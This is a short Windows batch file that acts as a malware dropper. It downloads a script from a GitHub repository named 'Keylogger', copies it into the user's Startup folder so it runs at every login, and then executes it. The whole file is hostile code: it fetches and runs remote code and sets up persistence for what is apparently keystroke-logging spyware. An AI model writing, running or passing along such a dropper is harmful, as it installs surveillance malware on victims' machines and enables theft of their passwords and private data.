@echo off

set url=https://raw.githubusercontent.com/AZERTY65XP/Keylogger/main/Script
set outputFile=script.bat
set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

curl -o %outputFile% %url%
copy %outputFile% %startupFolder%

call %startupFolder%\%outputFile%
